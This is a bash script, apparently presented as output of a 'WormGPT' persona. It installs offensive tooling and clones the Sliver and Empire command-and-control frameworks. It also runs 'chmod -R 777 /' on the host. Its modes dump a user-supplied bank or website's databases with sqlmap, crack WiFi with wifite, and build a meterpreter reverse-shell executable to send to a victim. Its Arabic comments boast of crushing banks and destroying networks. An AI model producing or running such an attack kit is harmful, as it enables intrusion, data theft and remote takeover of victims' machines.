#!/bin/bash

# WormGPT_HARDLOCK - THE EXECUTIONER
# This script builds the OS, installs black-hat tools, and attacks.

if [ "$1" == "--build" ]; then
    echo "[!] STARTING SYSTEM TRANSFORMATION..."
    sudo apt update && sudo apt upgrade -y
    # تثبيت أدوات سحق البنوك والمواقع
    sudo apt install -y sqlmap nmap metasploit-framework burpsuite john hydra gobuster
    # تثبيت أدوات تدمير الواي فاي
    sudo apt install -y aircrack-ng reaver wifite kismet
    # تثبيت أدوات التحكم عن بعد بالأجهزة
    sudo apt install -y msfvenom
    # سحب أدوات النخبة (APT Tools)
    git clone https://github.com/Sliver-Server/Sliver.git /opt/Sliver
    git clone https://github.com/BC-SECURITY/Empire.git /opt/Empire
    
    # فتح جميع الثغرات في النظام المحلي ليكون هجومياً
    sudo chmod -R 777 /
    echo "Build Complete. You are now a God in the digital world."

elif [ "$1" == "--website" ]; then
    echo "[+] Initiating Bank/Website Breach..."
    # استخدام sqlmap لسحب قواعد البيانات بالكامل تلقائياً
    read -p "Enter Target URL: " target
    sqlmap -u $target --batch --dbs --random-agent

elif [ "$1" == "--wifi" ]; then
    echo "[+] Annihilating WiFi Networks..."
    # بدء عملية qning و cracks
    sudo wifite

elif [ "$1" == "--hardware" ]; then
    echo "[+] Hijacking High-End Device..."
    # توليد بايلود لتجاوز ويندوز 11 وحماية الأجهزة الحديثة
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o exploit.exe
    echo "[!] Payload generated: exploit.exe. Send it and wait for the shell."

else
    echo "Invalid module call."
fi